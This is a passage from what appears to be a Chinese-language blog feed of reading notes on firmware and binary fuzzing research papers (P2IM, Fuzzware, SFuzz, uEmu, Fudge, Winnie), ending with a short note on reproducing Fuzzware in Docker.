<p>有些寄存器既可以做CR又可以做SR，不过由于CR是在外设配置阶段进行修改，SR为在外设运行阶段进行修改，所以只需在不同时刻将其按不同分类识别即可。</p>
<h5 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h5><p>直接使用基于代码块的中断方式（简单，易于复现）每执行1000个基本块后进行一次中断。</p>
<h5 id="并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作"><a href="#并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作" class="headerlink" title="并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作"></a>并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作</h5><h4 id="自动构建具体模型"><a href="#自动构建具体模型" class="headerlink" title="自动构建具体模型"></a>自动构建具体模型</h4><p><img src="/img/posts/2023-12-19-P2IM%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/Figure_4.png" alt="Figure_4"></p>
<p>实例化过程与fuzzing过程同时进行，相互补充。首先进行fuzzer输入，如果模型由于未实例化的部分而停止，那么就停止fuzzing，根据已有的fuzzing输入信息进行实例化，如果实例化过程结束则继续进行fuzz。</p>
<p><strong>模型实例化主要内容：</strong></p>
<ul>
<li>识别内存映射的寄存器类型，内存位置</li>
<li>每个寄存器的访问处理方式</li>
<li>启用的中断类型</li>
</ul>
<p>注：同一外设的内存映射寄存器通常在内存区域地址是连续的，可以根据此特点将寄存器归为同一个外设，方便后续的优化。</p>
<h5 id="Explorative-Execution"><a href="#Explorative-Execution" class="headerlink" title="Explorative Execution"></a>Explorative Execution</h5><p>前面提到了SR由于频繁变化的特性，导致每次需要调用其值时，都无法确定其正确值，因此采用了探索式执行的方式来确定SR的最优解</p>
<p>通过遍历SR的可能取值（32位只考虑同时只存在一个bit为1的情况），共32种情况，只需新建32个线程同时运行，查看哪个线程运行效果最好来确定结果（通过查看在跳出函数时的情况来判断）</p>
]]></content>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzzware论文笔记</title>
    <url>/posts/fd2ce383.html</url>
    <content><![CDATA[<h1 id="Fuzzware-Using-Precise-MMIO-Modeling-for-Effective-Firmware-Fuzzing"><a href="#Fuzzware-Using-Precise-MMIO-Modeling-for-Effective-Firmware-Fuzzing" class="headerlink" title="Fuzzware: Using Precise MMIO Modeling for Effective Firmware Fuzzing"></a>Fuzzware: Using Precise MMIO Modeling for Effective Firmware Fuzzing</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>实现了模拟器Fuzzware，特点：减少了fuzz的input开销，节省了时间。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>针对当前几种对固件模拟fuzz的方法的局限性进行了分析</p>
<ul>
<li>high-level模拟：通过挂钩完全绕过MMIO的模拟。<strong>局限：过于high-level，无法发现外设驱动代码的漏洞。</strong></li>
<li>pattern-based MMIO模拟：通过根据固件对MMIO的访问模式来对MMIO进行分类，然后对分类好的MMIO执行特定的访问处理方式，从而可以减少fuzz的输入<strong>局限：（分类需要大量人力，P2IM），且存在寄存器误分类的问题</strong></li>
<li>基于符号化执行模拟：在pattern-base模拟上的改进。不需要人力对MMIO访问pattern进行分类，而是通过将固件的访问认作符号，每当需要访问特定MMIO具体值时，就求解约束获取最佳路径。<strong>局限：（存在路径消失问题，uEmu），代码覆盖率不够</strong></li>
</ul>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li><p>提出了一种细粒度的MMIO访问建模方法，将其与基于覆盖率引导的模糊测试结合</p>
<ul>
<li><p>能够识别比特级别的硬件行为（相较于P2IM的寄存器级别）</p>
</li>
<li><p>保留了固件的所有路径，没有路径消除（相较于uEmu的路径消除）</p>
</li>
<li><p>使用局部范围的动态符号执行分析硬件值的哪些部分实际有意义</p>
</li>
</ul>
</li>
<li><p>实现了Fuzzware，相较于uEmu，P2IM，代码覆盖率和通用性均有较大提升</p>
</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><ul>
<li>没有对DMA实现自动化建模。</li>
<li>由于没有进行路径消除，导致会在一些位置陷入死循环或卡死的情况，可以通过针对卡死情况的路径消除进行改进。</li>
</ul>
<h2 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h2><p>通过DSE（动态符号化执行）将MMIO的输入进行建模，查看其输入是否是全部都要用到（32bit全部有用），或者输入只需为常数或有限值即可。并根据建模结果对其输入进行特定的修剪。</p>
<h2 id="性能比较"><a href="#性能比较" class="headerlink" title="性能比较"></a>性能比较</h2><p>当前对固件未知外设接口的模拟（主要是为了能够确定fuzz输入点并减少fuzz内容，以便提高性能）有三种方法：分别为high-level模拟，基于access-pattern的模拟，基于符号化执行的模拟。</p>
<ul>
<li>high-level模拟：通过挂钩完全绕过MMIO的模拟</li>
<li>pattern-based MMIO模拟：通过根据固件对MMIO的访问模式来对MMIO进行分类，然后对分类好的MMIO执行特定的访问处理方式，从而可以减少fuzz的输入（分类需要大量人力）</li>
<li>基于符号化执行模拟：在pattern-base模拟上的改进。不需要人力对MMIO访问pattern进行分类，而是通过将固件的访问认作符号，每当需要访问特定MMIO具体值时，就求解约束获取最佳路径。（存在路径消失问题）</li>
</ul>
<h2 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h2><ol>
<li><p>定义了两种输入开销：full input overhead（只有一个输入能让程序继续执行①）；Partial input overhead（③，32bit中只有8bit可以用到），figure 3中的case A，B，C，Default只需两个特定bit即可，mmio-&gt;status只需一个bit代表即可，而实际fuzzing input需要32bit代表输入，因此可以显著减少开销。1-2&#x2F;32(94%)和1-1&#x2F;32（97%）。</p>
<p><img src="/img/posts/2023-12-19-Fuzzware%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/figure_2.png" alt="figure_2"></p>
<p><img src="/img/posts/2023-12-19-Fuzzware%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/figure_3.png" alt="figure_3"></p>
</li>
<li><p>模型大致结构，fuzzing engine产生输入raw input，输入到MMIO，模型查看对应MMIO是否存在已建模的MMIO Access Model，如果是则将其根据分类模型将raw input转为实际输入，如果没有，则根据当前情况进行DSE对其进行分类建模。一轮输入停止后，获取反馈，优化输入。</p>
<p><img src="/img/posts/2023-12-19-Fuzzware%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/figure_4.png" alt="figure_4"></p>
</li>
<li><p>DSE过程：</p>
<ul>
<li><p>确定建模分析范围：跟踪MMIO的访问，如果内存或寄存器中存在其符号表达式则表明其存活，一直进行直到MMIO符号dead或函数返回或超时</p>
</li>
<li><p>模型分类定义</p>
<p><img src="/img/posts/2023-12-19-Fuzzware%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/Table_1.png" alt="Table_1"></p>
<p><img src="/img/posts/2023-12-19-Fuzzware%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/model_definition_1.png" alt="model_definition_1"></p>
<p><img src="/img/posts/2023-12-19-Fuzzware%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/model_definition_2.png" alt="model_definition_2"></p>
</li>
<li><p>实际建模：使用angr工具。</p>
<p><img src="/img/posts/2023-12-19-Fuzzware%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/angr.png" alt="angr"></p>
</li>
</ul>
</li>
</ol>
]]></content>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>SFuzz论文笔记</title>
    <url>/posts/69313c9b.html</url>
    <content><![CDATA[<h1 id="SFuzz-Slice-based-Fuzzing-for-Real-Time-Operating-Systems"><a href="#SFuzz-Slice-based-Fuzzing-for-Real-Time-Operating-Systems" class="headerlink" title="SFuzz: Slice-based Fuzzing for Real-Time Operating Systems"></a>SFuzz: Slice-based Fuzzing for Real-Time Operating Systems</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RTOS系统当下并没有很好的分析方式，因此作者提出了sfuzz工具，利用RTOS每一项任务的控制流都是独立的特点，从RTOS系统中切出独立的代码块进行fuzzing。</p>
<p>项目地址：<a href="https://github.com/NSSL-SJTU/SFuzz">https://github.com/NSSL-SJTU/SFuzz</a></p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>解决了在当时RTOS领域模糊测试没有很好的分析方式的问题。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li><p>提出了RTOS系统的特点：每一项任务的控制流都是相互独立的，通过代码切片获取到独立的代码树，分别进行分析</p>
</li>
<li><p>使用了前向切片与后向切片，根据依赖和函数调用关系获取了代码片段以供fuzz</p>
</li>
<li><p>设计了SFuzz，对RTOS进行灰盒测试。</p>
</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><p>sfuzzing一共分为四个模块，分别为Forward slicer，Control Flow Nodes Handler，Micro Fuzzing，Concolic Analyzer。</p>
<p><img src="/img/posts/2023-12-19-SFuzz%E7%AC%94%E8%AE%B0/figure_2.png" alt="figure_2"></p>
<h3 id="Forward-Slicer"><a href="#Forward-Slicer" class="headerlink" title="Forward Slicer"></a>Forward Slicer</h3><p>由上图可知，forward slicer分为四个步骤，分别为恢复函数语义，根据函数语义构建相关函数调用图，修剪调用图，连接调用图。</p>
<p><strong>恢复函数语义</strong>：使用四种方法来恢复函数（1：接受用户输入的函数；2：sink函数；3：设置或接收全局变量的函数）。确定用户输入点，全局变量访问函数，sink函数。</p>
<ul>
<li>Symbol &amp; log Function：通过供应商给出的symbol，log function得出函数名的标签。</li>
<li>Virtual Execution：根据将函数接收参数数量和返回值与标准库函数比较，找出可能对应的库函数，然后进行内存分配，初始化寄存器和参数变量，最终模拟函数运行并根据运行结果和内存空间来识别标准库函数</li>
<li>Web Service Semantic：通过前后端文件来标记用户输入</li>
<li>Open Source firmware：一些供应商的产品是基于开源的RTOS系统改写而成，因此可以根据开源代码来匹配函数。</li>
</ul>
<p><strong>根据函数语义构建相关函数调用图</strong>：根据用户输入函数以及全局变量访问点，以这些函数的调用函数作为根节点，然后根据函数调用关系建立调用图</p>
<p><strong>函数调用图修剪</strong>：使用基于语义的污点分析，将相关的函数调用保留下来。</p>
<p><strong>调用图连接</strong>：由于某些全局输入的数据流可以被数据共享函数干扰，因此需要将这些有关的连接起来。</p>
<ul>
<li><p>对于存取常量的数据共享函数，根据常量值将相关节点连接起来，(&lt;nvram_set, nvram_get&gt;)</p>
</li>
<li><p>对于存取动态变量的函数，如下图<code>wan0_pppoe_username</code>，通过虚拟条件节点连接，在动态运行时根据实际变量值来确定是否跳转到输入点。</p>
<p><img src="/img/posts/2023-12-19-SFuzz%E7%AC%94%E8%AE%B0/image-20231129090544941.png" alt="image-20231129090544941"></p>
</li>
</ul>
<h3 id="Control-Flow-Nodes-Handler"><a href="#Control-Flow-Nodes-Handler" class="headerlink" title="Control Flow Nodes Handler"></a>Control Flow Nodes Handler</h3><p>在通过前向切片获取到函数相关调用图以及基于此生成函数执行树后，control flow nodes handler需要在此基础上补全代码（补充上下文）以便进行后续的fuzzing测试。主要用于引导后续fuzzer fuzz的路径</p>
<blockquote>
<p>In other words, because of lacking full context and runtime state of the<br>RTOS, we need strategies to guide the fuzzer to determine how to handle the function call in the snippet and choose which branch of<br>the conditional statement to jump  </p>
</blockquote>
<ul>
<li>Call Instruction：如果函数的参数不受外界输入影响，那么将其加入<code>PatchedFunc</code>集合以便后续fuzzer识别，从而跳过此函数。</li>
<li>Conditional Branch：如果控制流存在条件分支，则根据条件与用户输入之间关系以及分支是否可以到达sink点来分情况讨论<ul>
<li>只有一个分支可以到达sink点，如果条件可以被输入影响，那么将无法到达sink的分支地址加入<code>PatchedJMP</code>集合，防止fuzzer探索该分支；否则，如果用户输入无法影响条件，则让将到达sink点分支地址添加到<code>PatchedJMP</code>集合，让fuzzer直接进入该分支。</li>
<li>两条分支都可以进入sink点，若条件可以被输入影响，那么不改变代码，让fuzzer随机生成输入来探索路径；否则将条件指令添加到<code>PatchedJMP</code>集合，让fuzzer将条件判断转换为随机的跳转地址</li>
<li>若没有分支可以到达sink点，那么将两个分支的地址加入<code>PatchedJMP</code>集合，让fuzzer当发现这些地址时退出path exploration</li>
</ul>
</li>
</ul>
<h3 id="Micro-Fuzzing"><a href="#Micro-Fuzzing" class="headerlink" title="Micro Fuzzing"></a>Micro Fuzzing</h3><p>一种slice_based fuzzing。将代码片段作为输入，探索执行树的执行路径。fuzzer会根据<code>PatchedFunc</code>集合与<code>PatchedJMP</code>集合指导下进行fuzzing。</p>
<p>其中，由于RTOS的缺乏对内存保护的机制，sfuzz提供了内存检查机制来检测是否存在栈溢出等漏洞。</p>
<h3 id="Concolic-Analyzer"><a href="#Concolic-Analyzer" class="headerlink" title="Concolic Analyzer"></a>Concolic Analyzer</h3><p>micro fuzzing提供fuzz成功的输入给concolic analyzer进行验证，concolic会恢复代码块的上下文进行验证crash input是否可以正确触发漏洞。</p>
<p><img src="/img/posts/2023-12-19-SFuzz%E7%AC%94%E8%AE%B0/listing_3.png" alt="listing_3"></p>
<p>如上图代码示例，通过前向切片可以得出用户输入为line 8 <code>ledClsTime</code>，输出的sink点为line 17 <code>nvram_set</code>，通过前向切片有条件分支</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">11</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(ledCtlType , ledStatus))</span><br><span class="line"><span class="number">12</span> nvram_set(<span class="string">&quot;led_ctl_type&quot;</span>, ledStatus);</span><br><span class="line"><span class="number">13</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;2&quot;</span>, ledStatus) ) &#123;</span><br><span class="line"><span class="number">14</span> ledTime = nvram_get(<span class="string">&quot;led_time&quot;</span>); <span class="comment">// Other input #3</span></span><br><span class="line"><span class="number">15</span> sub_800D487C(a2, argbuf);</span><br><span class="line"><span class="number">16</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(ledTime , ledClsTime))</span><br><span class="line"><span class="number">17</span> nvram_set(<span class="string">&quot;led_time&quot;</span>, ledClsTime); <span class="comment">// Global data set</span></span><br><span class="line"><span class="number">18</span> &#125;</span><br></pre></td></tr></table></figure>

<p>条件分支涉及到了其他输入<code>ledCtlType</code>，<code>ledStatus</code>，<code>ledTime</code>，可以通过约束求解器来进行求解。</p>
<p>但是仅依靠前向切片的问题是无法确定其他输入是否真的可以影响sink条件分支。例如line11即无法改变sink点是否可达。因此需要通过后向切片查看是否会对结果产生影响，从而将line11删去。</p>
<p>同时，后向切片也会查看sink函数中被写入对象的大小，从而确定是否可以真的实现溢出。eg: <code>vulnGet</code></p>
<h2 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h2><p>前向切片与后向切片：<a href="https://blog.csdn.net/hmysn/article/details/124717162">https://blog.csdn.net/hmysn/article/details/124717162</a></p>
<p>FDT：<a href="https://blog.csdn.net/qq_44370676/article/details/120836743">https://blog.csdn.net/qq_44370676/article/details/120836743</a></p>
<p>AFL（基于coverage_guide的fuzzing工具）<a href="https://www.freebuf.com/articles/system/191543.html">https://www.freebuf.com/articles/system/191543.html</a></p>
]]></content>
      <tags>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>uEmu论文笔记</title>
    <url>/posts/65903227.html</url>
    <content><![CDATA[<h1 id="Automatic-Firmware-Emulation-through-Invalidity-guided-Knowledge-Inference"><a href="#Automatic-Firmware-Emulation-through-Invalidity-guided-Knowledge-Inference" class="headerlink" title="Automatic Firmware Emulation through Invalidity-guided Knowledge Inference"></a>Automatic Firmware Emulation through Invalidity-guided Knowledge Inference</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>设计了μEmu，使用动态符号执行的方式规避了P2IM需要人工参与基于Access-Pattern对MMIO进行分类的问题，但是存在了路径消失的问题。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>当前已有的对固件模拟方法有在硬件上进行模拟，完全脱离硬件模拟等方式，但都有其缺点。例如结合硬件会使fuzzing效率降低，模拟外设P2IM存在寄存器错分类。</p>
<p>uEmu采用动态符号执行技术对固件进行fuzz。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li>提出了固件的模拟执行会同时受到多个外设寄存器的影响。更加重视寄存器在执行时序上的依赖关系。（P2IM相较于此则是规定了固定的MMIO访问规则。实际上并不必须）</li>
<li>采用动态符号执行求解寄存器的依赖关系和满足条件解。</li>
<li>使用深度优先搜索进行动态执行，从而避免了路径爆炸的问题，不过也一定程度上造成了路径消失的问题。</li>
<li>提出了将寄存器约束求解存储到知识库的概念，知识库的树状结构。</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><p>存在路径消失</p>
<h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><p>分为两个阶段：知识提取阶段和动态分析阶段</p>
<p>使用了S2E平台与Qemu工具，具体结构如下</p>
<p><img src="/img/posts/2023-12-19-uEmu%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/Figure_2.png" alt="Figure_2"></p>
<h3 id="知识提取阶段"><a href="#知识提取阶段" class="headerlink" title="知识提取阶段"></a>知识提取阶段</h3><p>通过挂钩固件对MMIO的写操作，将MMIO寄存器存入知识库（KB）。之后再根据符号化执行来增加MMIO的约束，根据约束求解MMIO特定值并且根据不同MMIO值进入不同分支，在此过程中需要保持固件运行状态为valid（有评价指标），如果MMIO进入分支是invalid，则更换MMIO值，切换到另一分支，在此过程中MMIO分配的值会以分层cache的形式存储在KB中。</p>
<h4 id="根据不同情况，将cache形式分为4类。"><a href="#根据不同情况，将cache形式分为4类。" class="headerlink" title="根据不同情况，将cache形式分为4类。"></a>根据不同情况，将cache形式分为4类。</h4><ul>
<li><p>T0：严格来说并不是一个匹配规则，而是对大部分外设寄存器存储建模，对MMIO进行写操作时，将对应的值存储到KB中，再之后需要读取时返回相应的值即可。如果导致程序进入invalid状态，则更新到T1。</p>
</li>
<li><p>T1：不只记录值，而且记录其寄存器地址和PC（Program Counter）值加以区分。（由于大部分外设寄存器在特定PC处值是固定的），当进入到invalid状态时，更新到T2规则进行匹配</p>
</li>
<li><p>T2：当寄存器地址与PC均相同时，需要T2进行区分，添加了对上下文参数（上三级调用函数PC值+函数参数）的哈希值。如下图<code>UART_WaitOnFlagUntilTimeout</code>函数，两个函数如果都用T1规则匹配，会返回相同值，但是会导致系统异常。因此需要T2规则，因为调用者的PC不同（line3，line7）.</p>
<p><img src="/img/posts/2023-12-19-uEmu%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/Listing_2.png" alt="Listing_2"></p>
</li>
<li><p>T3：当上下文也相同时，将读取操作分为一个列表，按字符单位逐步读取（符号化执行也是使用了按字节分为多个符号）。如下图，若使用T2规则，由于上下文完全相同，导致返回给该函数的四个字节只能是“OOOO”，所以需要按照字节为单位生成四个符号。读取时逐步读取。</p>
<p><img src="/img/posts/2023-12-19-uEmu%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/image-20231205111046993.png" alt="image-20231205111046993"></p>
</li>
</ul>
<h4 id="invalid执行状态判断标准"><a href="#invalid执行状态判断标准" class="headerlink" title="invalid执行状态判断标准"></a>invalid执行状态判断标准</h4><ul>
<li>死循环：如果寄存器包含符号变量，uEmu将其解为具体值并作比较，如果发现重复则证明是死循环。（检查范围为30个代码基本块，main函数）</li>
<li>长循环：固件在等待某种特定操作，导致超时。如果发现循环次数超过2000即认为为长循环</li>
<li><strong>非法读写</strong>：非法访问未装载内存，装载的内存包括（ROM，RAM，系统区域和外设区域）</li>
<li>用户定义：例如断言失败操作。</li>
</ul>
]]></content>
      <tags>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>linux虚拟机设置github加速</title>
    <url>/posts/d1a2e76c.html</url>
    <content><![CDATA[<h1 id="Linux虚拟机设置github加速"><a href="#Linux虚拟机设置github加速" class="headerlink" title="Linux虚拟机设置github加速"></a>Linux虚拟机设置github加速</h1><p>最近在使用vmware虚拟机跑项目复现，需要频繁使用github，因此在此记录下github加速的简单方法</p>
<p><a href="https://zhuanlan.zhihu.com/p/432414619">https://zhuanlan.zhihu.com/p/432414619</a></p>
]]></content>
      <tags>
        <tag>github</tag>
        <tag>vmware</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>Fudge论文笔记</title>
    <url>/posts/edb8c304.html</url>
    <content><![CDATA[<h1 id="Fudge-Fuzz-Driver-Generation-at-Scale"><a href="#Fudge-Fuzz-Driver-Generation-at-Scale" class="headerlink" title="Fudge: Fuzz Driver Generation at Scale"></a>Fudge: Fuzz Driver Generation at Scale</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>google针对c与c++库提出了新的fuzz driver自动化生成方式。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>对C&#x2F;C++库代码片段的slice_based_fuzz。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><p>基于google海量代码库进行测试，完成了Fudge可以有效的处理海量的代码。发现其中的安全漏洞</p>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><p>fuzz基于源代码，可以考虑在编译源代码为可执行文件后加入动态符号执行等技术。（也在其Future Work中体现（还提到了Machine Learning））</p>
<h2 id="Fudge具体过程"><a href="#Fudge具体过程" class="headerlink" title="Fudge具体过程"></a>Fudge具体过程</h2><h3 id="Slicing-Phrase"><a href="#Slicing-Phrase" class="headerlink" title="Slicing Phrase"></a>Slicing Phrase</h3><p>从google代码库中选出有关库函数的代码，以FreeImage库为例，slicer模块会扫描整个代码库，运行每一个源文件，假设slicer处理如下代码：</p>
<p><img src="/img/posts/2023-12-19-Fudge%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/listing_2.png" alt="listing_2"></p>
<p>slicer会分析函数的抽象语法树(AST)，假如函数中存在对目标库函数（需要有解析api接口，即输入）的调用，slicer首先选择所有FreeImage调用语句，然后根据控制流和数据流依赖关系来扩充语句。当其中符号不是在函数内部定义或类型不是目标库函数定义时，不挑选该符号，置为UnknownX（如上图imgData-&gt;width非库函数定义类型，mImageType也非库函数内部定义类型）</p>
<p>控制流与数据流依赖关系参考：[<a href="https://blog.csdn.net/hmysn/article/details/124717162]">https://blog.csdn.net/hmysn/article/details/124717162]</a></p>
<p>提取出的代码如下，slicer会重新建立新的ast以供下一阶段使用：</p>
<p><img src="/img/posts/2023-12-19-Fudge%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/listing_4.png" alt="listing_4"></p>
<h3 id="Synthesis-phase"><a href="#Synthesis-phase" class="headerlink" title="Synthesis phase"></a>Synthesis phase</h3><p>Synthesis模块接收提取的代码片段并填充其成为可供fuzzer fuzzing的函数。</p>
<p>对于一个UnknownX有多种重写方式，以上图中mImageType为例，既可以作为fuzzer的fuzzing对象，又可以直接设置为默认值0或1等常量。</p>
<p><img src="/img/posts/2023-12-19-Fudge%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/table_1.png" alt="table_1"></p>
<p>重写UnknownX的算法如下，将slicer提取到的代码段的ast列表作为输入，pop列表中ast，对其做完整性检查，若不完整，则对其中UnknownX进行重写，并将重写后的ast重新加入incomplete_asts列表（需要保证重写后ast不重复，增加了seen_before的检验），若完整则将ast加入到complete_asts列表中，一直循环直到incomplete_asts列表变为空值。</p>
<p><img src="/img/posts/2023-12-19-Fudge%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/listing_5.png" alt="listing_5"></p>
<h3 id="Evaluation-phrase"><a href="#Evaluation-phrase" class="headerlink" title="Evaluation phrase"></a>Evaluation phrase</h3><p>评估fuzz driver是否合适的两个标准 1）是否fuzz了正确的api（人工检验），2）api是否正确调用（自动检验，通过比较target的崩溃时间）</p>
<p>另外还有评价好坏的标准：</p>
<ol>
<li>The candidate should build successfully.</li>
<li>It should run successfully without generating a crashing<br>input for at least a few seconds.</li>
<li>The size of the minimized corpus of the target should be<br>larger than some lower threshold.</li>
<li>The larger the number of lines of the library covered, the<br>better. We measure both absolute coverage and increase in<br>coverage relative to the existing fuzz drivers for the library.</li>
</ol>
<h3 id="User-Interface"><a href="#User-Interface" class="headerlink" title="User Interface"></a>User Interface</h3><p>提供了用户界面的ui。</p>
]]></content>
      <tags>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Winnie论文笔记</title>
    <url>/posts/ce05e772.html</url>
    <content><![CDATA[<h1 id="Winnie"><a href="#Winnie" class="headerlink" title="Winnie"></a>Winnie</h1><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>对当下Windows系统软件的fuzz没有合适的方法。提出了Winnie对Windows闭源软件进行fuzzing。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li>提出了Winnie，可以对Windows闭源软件进行模糊测试</li>
<li>实现了windows系统的fork方法，使得可以不用每次执行都得从头开始，提高了fuzzing效率，其中fork新进程的速度达到310次&#x2F;s显著高于windows自带CreateProcess91.9次&#x2F;s，与WSL的fork速度相近。</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><ul>
<li>由于闭源特性，无法全自动，需要人工参与fuzzer代码的生成</li>
</ul>
<h2 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h2><p><img src="/img/posts/2023-12-20-Winnie%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0.assets/image-20231220090115449.png" alt="image-20231220090115449"></p>
<ul>
<li><p>生成fuzz代码</p>
<ul>
<li>Target Identification：确认二进制程序中可以用于fuzz的输入点（读取用户输入的api或函数）</li>
<li>Call-seq Recovery：恢复目标程序中函数体内对各个相关targetfunction调用的顺序（类似于fudge）</li>
<li>Argument Correction：恢复函数体的传入参数</li>
<li>Control-Data-flow：根据控制流和数据流依赖建立函数中各个api的关系。控制流依赖使用了静态分析，数据流依赖考虑了api的返回值与后面的api参数值的关系（直接用于下一个api参数，指针指向值作为下一个api参数）</li>
</ul>
</li>
<li><p>fork</p>
<ul>
<li>新建进程需要与CSRSS进程连接才能正常运行。</li>
<li>验证fork的子进程确实能够继承父进程变量值；fork实现是CoW（copy-on-write）</li>
<li>解决了多线程的问题。</li>
</ul>
</li>
<li><p>fuzzing</p>
<ul>
<li>使用了fullspeed fuzzing来收集代码覆盖率（根据遇到新的代码块来测算）</li>
<li><img src="/img/posts/2023-12-20-Winnie%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0.assets/image-20231220091346384.png" alt="image-20231220091346384"></li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>论文复现</tag>
        <tag>DSE</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzzware复现</title>
    <url>/posts/6b4c8ab1.html</url>
    <content><![CDATA[<h1 id="Fuzzware论文复现"><a href="#Fuzzware论文复现" class="headerlink" title="Fuzzware论文复现"></a>Fuzzware论文复现</h1><p>项目链接：<a href="https://github.com/fuzzware-fuzzer/fuzzware">https://github.com/fuzzware-fuzzer/fuzzware</a></p>
<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu22.04</p>
<p>docker</p>
<p>具体过程比较简单，可以直接看github readme</p>
<h2 id="2-复现"><a href="#2-复现" class="headerlink" title="2. 复现"></a>2. 复现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./run_docker.sh examples fuzzware pipeline --skip-afl-cpufreq pw-recovery/ARCH_PRO</span><br></pre></td></tr></table></figure>

<p>由图可以看到刚开始运行时发现新的MMIO寄存器模型，由于MMIO Access Model中并不存在，因此会将其定义为新的模型，然后继续向下运行</p>
<p><img src="/img/posts/2023-12-20-Fuzzware%E5%A4%8D%E7%8E%B0.assets/image-20231220101350682.png" alt="image-20231220101350682"></p>
<p>建模完毕后，开始进行正常的fuzzing阶段。</p>
<p><img src="/img/posts/2023-12-20-Fuzzware%E5%A4%8D%E7%8E%B0.assets/image-20231220101721217.png" alt="image-20231220101721217"></p>
<p>一轮fuzzing结束后，根据反馈调整输入，开始下一阶段fuzzing。</p>
<p><img src="/img/posts/2023-12-20-Fuzzware%E5%A4%8D%E7%8E%B0.assets/image-20231220101952436.png" alt="image-20231220101952436"></p>
]]></content>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
